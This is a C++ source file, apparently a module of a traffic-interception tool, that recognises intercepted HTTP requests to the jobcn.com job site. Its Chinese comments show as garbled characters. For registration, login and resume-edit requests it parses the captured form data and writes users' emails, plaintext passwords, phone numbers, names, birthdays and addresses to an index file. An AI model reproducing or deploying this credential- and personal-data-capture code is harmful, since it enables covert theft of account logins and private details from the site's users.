#include "StdAfx.h"
#include "EmployZhuoBo.h"

employ::ZhuoBo::ZhuoBo(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "׿���˲���";
}

employ::ZhuoBo::~ZhuoBo()
{
	
}

int employ::ZhuoBo::IsZhuoBo(HttpSession *http_session)
{
	//ע��(����ע��)
	if((http_session->m_Requestline.m_Host.Find("www.jobcn.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/register_action")!=-1) )
	{
		return kPcWebRegisterEmail;
	}
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.jobcn.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/login_action")!=-1) )
	{
		return kPcWebLogin;
	}
	//�޸ĸ�����Ϣ
	if((http_session->m_Requestline.m_Host.Find("www.jobcn.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/resume/edit.ujson")!=-1) )
	{
		return kPCWebModiy;
	}
	return 0;
}

int employ::ZhuoBo::Process(const char *packet,int action)
{
	//ע��(����ע��)
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//�޸ĸ�����Ϣ
	if (action==kPCWebModiy)
	{
		return PCWebModiy(packet);
	}
	return 1;
}

//ע��(����ע��)
int employ::ZhuoBo::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�û���
	string email = ms_->GetValueFromMapByKey("email",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	//�ֻ���
	string phone = ms_->GetValueFromMapByKey("mobileNum",true);
	if (email.empty() || password.empty() || phone.empty())
	{
		return 0;
	}
	output_text_ =
		"mid=" + email + "\r\n" + 		//����		
		"pass=" + password + "\r\n" + 	//����	
		"oid=" + phone + "\r\n" + 		//�ֻ���	
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=ע��\r\n";
	WriteIndexFile();
	return 1;
}

//��¼
int employ::ZhuoBo::PcWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�˺�
    string UserName = ms_->GetValueFromMapByKey("userName",true);
	//����
	string Password = ms_->GetValueFromMapByKey("password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//�˺�		
		"pass=" + Password + "\r\n" + 	//����
		"netmark=" + app_ + "\r\n" + 	//��Դ
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

int employ::ZhuoBo::PCWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	src_data = src_data.substr(src_data.find("base=")+strlen("base="));
	Json::Value vale;
	Json::Reader reader;
	if (reader.parse(src_data,vale))
	{
		//����
		string name = vale["name"].asString();
		//�Ա�
		string gender = vale["sex"].asString();
		if(gender == "1"){gender = "��";}
		if(gender == "2"){gender = "Ů";}
		//��������
		string birth = vale["birthday"].asString();
		//��ס��
		string address = vale["locationPC"].asString() + vale["address"].asString() ;
		//�ֻ���
		string mobile = vale["mobile"].asString();
		//����
		string email = vale["email"].asString();
		if (name.empty() || gender.empty() || birth.empty() || address.empty() || mobile.empty() || email.empty())
		{
			return 0;
		}
		output_text_=
			"servername=" + name + "\r\n" + //����	        
			"sex=" + gender + "\r\n" + 		//�Ա�	
			"msg=" + birth + "\r\n" + 		//��������
			"oid=" + mobile + "\r\n" + 		//�ֻ���	
			"mid=" + email + "\r\n" + 		//����	
			"nick="	+ address + "\r\n" + 	//��ַ	
			"netmark=" + app_ + "\r\n" + 	//��Դ
			"state=�޸Ļ�����Ϣ\r\n";  
		WriteIndexFile();
	}
	return 1;
}